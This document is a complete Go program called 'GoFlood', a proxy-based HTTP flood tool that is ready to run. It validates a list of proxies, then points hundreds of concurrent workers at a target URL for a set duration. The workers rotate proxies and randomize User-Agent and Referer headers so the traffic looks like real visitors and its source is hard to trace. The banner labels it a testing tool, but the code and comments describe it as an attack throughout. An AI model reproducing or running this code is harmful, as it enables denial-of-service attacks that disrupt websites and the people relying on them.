package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	// Default target for checking proxies. Google's generate_204 is fast and reliable.
	defaultProxyCheckTarget = "https://www.google.com/generate_204"
	// Timeout for checking a single proxy
	proxyCheckTimeout = 5 * time.Second
	// Timeout for attack requests via proxy
	attackRequestTimeout = 8 * time.Second
	// Program name and version
	programName    = "GoFlood"
	programVersion = "1.0.0"
)

// Statistics to track attack progress
type AttackStats struct {
	sync.Mutex
	totalRequests      int64
	successfulRequests int64
	failedRequests     int64
}

// --- Main Function ---
func main() {
	// Print banner
	printBanner()

	// --- Command Line Flags ---
	targetURLFlag := flag.String("target", "", "Target URL (Required, e.g., http://example.com or https://example.com:443)")
	proxyFileFlag := flag.String("proxies", "", "Path to proxy list file (Required, one proxy per line like http://ip:port or socks5://user:pass@ip:port)")
	numWorkersFlag := flag.Int("workers", 500, "Number of concurrent attack workers (Goroutines)")
	durationFlag := flag.Duration("duration", 60*time.Second, "Duration of the attack (e.g., 30s, 1m, 2h)")
	proxyCheckTargetFlag := flag.String("proxycheck", defaultProxyCheckTarget, "URL to use for checking proxy validity")
	skipProxyCheckFlag := flag.Bool("skipcheck", false, "Skip the proxy checking phase (use all proxies)")
	verboseFlag := flag.Bool("verbose", false, "Enable verbose logging of attack progress")

	flag.Parse()
	
	// Initialize random number generator with current time
	rand.Seed(time.Now().UnixNano())

	// --- Input Validation ---
	if *targetURLFlag == "" {
		log.Fatal("Error: Target URL (-target) is required.")
	}
	targetURL, err := url.Parse(*targetURLFlag)
	if err != nil || (targetURL.Scheme != "http" && targetURL.Scheme != "https") {
		log.Fatalf("Error: Invalid target URL '%s'. Must start with http:// or https://", *targetURLFlag)
	}
	if *proxyFileFlag == "" {
		log.Fatal("Error: Proxy file path (-proxies) is required.")
	}
	if *numWorkersFlag <= 0 {
		log.Fatal("Error: Number of workers must be positive.")
	}

	// --- Load Proxies ---
	log.Printf("Loading proxies from %s...", *proxyFileFlag)
	loadedProxies, err := loadProxies(*proxyFileFlag)
	if err != nil {
		log.Fatalf("Error loading proxies: %v", err)
	}
	if len(loadedProxies) == 0 {
		log.Fatal("Error: No proxies loaded from file.")
	}
	log.Printf("Loaded %d proxies.", len(loadedProxies))

	// --- Check Proxies (Optional) ---
	var workingProxies []*url.URL
	if !*skipProxyCheckFlag {
		log.Printf("Checking proxies against %s (this may take a while)...", *proxyCheckTargetFlag)
		workingProxies = checkProxies(loadedProxies, *proxyCheckTargetFlag)
		log.Printf("Found %d working proxies.", len(workingProxies))
		if len(workingProxies) == 0 {
			log.Fatal("Error: No working proxies found after checking. Cannot proceed.")
		}
	} else {
		log.Println("Skipping proxy check as requested.")
		workingProxies = loadedProxies // Use all loaded proxies
	}

	// --- Setup Context for Duration and Graceful Shutdown ---
	mainCtx, cancelMain := context.WithCancel(context.Background())
	attackCtx, cancelAttack := context.WithTimeout(mainCtx, *durationFlag)
	defer cancelAttack() // Ensure attack context resources are released

	// Handle Ctrl+C (SIGINT) and SIGTERM for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		sig := <-sigChan // Wait for signal
		log.Printf("Shutdown signal received (%v), stopping workers...", sig)
		cancelMain()   // Cancel the main context, which cancels attackCtx too
		cancelAttack() // Also cancel the attack context explicitly
	}()

	// Initialize attack statistics
	stats := &AttackStats{}

	// --- Start Attack Workers ---
	var wg sync.WaitGroup
	log.Printf("Starting attack on %s with %d workers using %d proxies for %s...",
		targetURL.String(), *numWorkersFlag, len(workingProxies), *durationFlag)

	// Launch worker goroutines
	for i := 0; i < *numWorkersFlag; i++ {
		wg.Add(1)
		go attackWorker(attackCtx, &wg, targetURL, workingProxies, i, stats, *verboseFlag)
	}

	// Start a goroutine to periodically report progress
	if !*verboseFlag {
		go reportProgress(attackCtx, stats)
	}

	// --- Wait for Attack to Finish ---
	<-attackCtx.Done() // Block until the attack duration expires or a signal is received

	if err := attackCtx.Err(); err == context.DeadlineExceeded {
		log.Println("Attack duration finished.")
	} else if err == context.Canceled {
		// Already logged by the signal handler or potentially other cancellations
	}

	// Ensure main context is cancelled if timeout occurred first
	cancelMain()

	log.Println("Waiting for workers to stop gracefully...")
	wg.Wait() // Wait for all attackWorker goroutines to finish

	// Final statistics report
	log.Printf("Attack completed. Statistics: %d total requests, %d successful, %d failed",
		stats.totalRequests, stats.successfulRequests, stats.failedRequests)
	log.Println("All workers finished. Exiting.")
}

// --- Progress Reporting Function ---
func reportProgress(ctx context.Context, stats *AttackStats) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			stats.Lock()
			log.Printf("Progress: %d total requests, %d successful, %d failed",
				stats.totalRequests, stats.successfulRequests, stats.failedRequests)
			stats.Unlock()
		}
	}
}

// --- Proxy Loading Function ---
func loadProxies(filePath string) ([]*url.URL, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, fmt.Errorf("failed to open proxy file: %w", err)
	}
	defer file.Close()

	var proxies []*url.URL
	scanner := bufio.NewScanner(file)
	lineNumber := 0
	for scanner.Scan() {
		lineNumber++
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") { // Skip empty lines and comments
			continue
		}

		// Ensure scheme is present for url.Parse, default to http if missing
		if !strings.Contains(line, "://") {
			line = "http://" + line // Assume http if not specified
		}

		proxyURL, err := url.Parse(line)
		if err != nil {
			log.Printf("Warning: Skipping invalid proxy URL on line %d ('%s'): %v", lineNumber, line, err)
			continue
		}

		// Basic validation for supported schemes
		switch proxyURL.Scheme {
		case "http", "https", "socks5", "socks4": // Include SOCKS schemes for completeness
			proxies = append(proxies, proxyURL)
		default:
			log.Printf("Warning: Skipping unsupported proxy scheme on line %d: %s", lineNumber, proxyURL.Scheme)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading proxy file: %w", err)
	}

	return proxies, nil
}

// --- Proxy Checking Functions ---

// checkProxies concurrently checks a list of proxies.
func checkProxies(proxies []*url.URL, checkTarget string) []*url.URL {
	var workingProxies []*url.URL
	var wg sync.WaitGroup
	var mutex sync.Mutex // To safely append to workingProxies

	// Limit concurrency to avoid overwhelming the system or the check target
	concurrencyLimit := 100 // Adjust as needed
	sem := make(chan struct{}, concurrencyLimit)

	// Create progress channels for reporting
	total := len(proxies)
	processed := 0
	progressChan := make(chan bool, total)

	// Start progress reporter
	go func() {
		for range progressChan {
			processed++
			if processed%50 == 0 || processed == total {
				log.Printf("Proxy check progress: %d/%d (%.1f%%)", 
					processed, total, float64(processed)*100/float64(total))
			}
		}
	}()

	for _, proxyURL := range proxies {
		wg.Add(1)
		sem <- struct{}{} // Acquire semaphore slot
		go func(p *url.URL) {
			defer wg.Done()
			defer func() { <-sem }() // Release semaphore slot

			// Use a context with timeout for the check
			checkCtx, cancel := context.WithTimeout(context.Background(), proxyCheckTimeout)
			defer cancel()

			if isProxyWorking(checkCtx, p, checkTarget) {
				mutex.Lock()
				workingProxies = append(workingProxies, p)
				mutex.Unlock()
			}
			
			progressChan <- true // Report progress
		}(proxyURL)
	}

	wg.Wait() // Wait for all checks to complete
	close(progressChan) // Close progress channel
	
	return workingProxies
}

// isProxyWorking checks if a single proxy can reach the target URL.
func isProxyWorking(ctx context.Context, proxyURL *url.URL, checkTarget string) bool {
	// Configure transport to use the specific proxy
	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		// Use DialContext for timeout on establishing the connection *through the proxy*
		DialContext: (&net.Dialer{
			Timeout:   proxyCheckTimeout, // Connection timeout
			KeepAlive: 0,                 // Disable keep-alive for checks
		}).DialContext,
		TLSHandshakeTimeout:   proxyCheckTimeout,   // TLS handshake timeout
		ExpectContinueTimeout: 1 * time.Second,
		ResponseHeaderTimeout: proxyCheckTimeout,   // Timeout waiting for headers
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true}, // Allow self-signed certs
		DisableKeepAlives:     true, // Don't reuse connections for checks
	}

	// Create a client specifically for this check
	client := &http.Client{
		Transport: transport,
		Timeout:   proxyCheckTimeout, // Overall timeout for the request
	}

	req, err := http.NewRequestWithContext(ctx, "GET", checkTarget, nil)
	if err != nil {
		return false
	}
	
	// Set a common user agent
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// For generate_204, we expect 204. For others, usually 2xx or 3xx.
	// Be lenient here, success means we got *some* valid HTTP response through the proxy.
	return resp.StatusCode >= 200 && resp.StatusCode < 400
}

// --- Attack Worker Function ---
func attackWorker(ctx context.Context, wg *sync.WaitGroup, targetURL *url.URL, 
                  proxies []*url.URL, workerID int, stats *AttackStats, verbose bool) {
	defer wg.Done()

	if len(proxies) == 0 {
		log.Printf("Worker %d exiting: No proxies available.", workerID)
		return
	}

	// User agents for randomization
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
	}

	// Create a reusable transport template
	baseTransport := &http.Transport{
		// Use DialContext for attack phase timeouts
		DialContext: (&net.Dialer{
			Timeout:   attackRequestTimeout,
			KeepAlive: 30 * time.Second, // Allow keep-alive during attack
		}).DialContext,
		TLSHandshakeTimeout:   attackRequestTimeout,
		ResponseHeaderTimeout: attackRequestTimeout,
		MaxIdleConns:          10, // Limit idle connections per worker
		MaxIdleConnsPerHost:   5,
		IdleConnTimeout:       60 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true}, // Essential for many targets
		DisableKeepAlives:     false, // Keep-alive can increase pressure sometimes
	}

	client := &http.Client{
		Transport: baseTransport,
		Timeout:   attackRequestTimeout + 2*time.Second, // Slightly larger client timeout
	}

	proxyCount := len(proxies)
	targetStr := targetURL.String()

	// Attack loop
	for {
		select {
		case <-ctx.Done():
			// Context cancelled (timeout reached or interrupt signal)
			return // Exit the loop
		default:
			// Select a random proxy for this request
			proxy := proxies[rand.Intn(proxyCount)]
			
			// Create request context with timeout
			reqCtx, cancelReq := context.WithTimeout(ctx, attackRequestTimeout)

			// Configure transport for this proxy
			baseTransport.Proxy = http.ProxyURL(proxy)

			// Create a new request for each attempt
			req, err := http.NewRequestWithContext(reqCtx, "GET", targetStr, nil)
			if err != nil {
				if verbose {
					log.Printf("Worker %d: Error creating request: %v", workerID, err)
				}
				cancelReq()
				continue
			}

			// Add randomized headers
			req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Accept-Language", "en-US,en;q=0.9")
			req.Header.Set("Accept-Encoding", "gzip, deflate")
			req.Header.Set("Cache-Control", "no-cache")
			req.Header.Set("Pragma", "no-cache")
			req.Header.Set("Connection", "keep-alive")
			
			// Randomly add a referer
			if rand.Intn(2) == 1 {
				req.Header.Set("Referer", fmt.Sprintf("https://www.google.com/search?q=%d", rand.Intn(10000)))
			}

			// Update attack statistics
			stats.Lock()
			stats.totalRequests++
			stats.Unlock()

			// Send the request
			resp, err := client.Do(req)
			
			if err != nil {
				stats.Lock()
				stats.failedRequests++
				stats.Unlock()
				
				if verbose {
					log.Printf("Worker %d via %s: Error: %v", workerID, proxy.Host, err)
				}
				cancelReq()
				continue
			}

			// Update success statistics
			stats.Lock()
			stats.successfulRequests++
			stats.Unlock()

			if verbose {
				log.Printf("Worker %d via %s: Status %d", workerID, proxy.Host, resp.StatusCode)
			}

			// Read a bit of response body to ensure connection is fully handled
			buffer := make([]byte, 1024)
			_, _ = resp.Body.Read(buffer)
			resp.Body.Close()
			
			cancelReq() // Clean up request context
		}
	}
}

// printBanner displays the program name and version
func printBanner() {
	banner := fmt.Sprintf(`
╔════════════════════════════════════════════════╗
║                                                ║
║   %s v%s                                ║
║   Proxy-based HTTP Flood Testing Tool          ║
║                                                ║
╚════════════════════════════════════════════════╝
`, programName, programVersion)
	
	fmt.Println(banner)
}
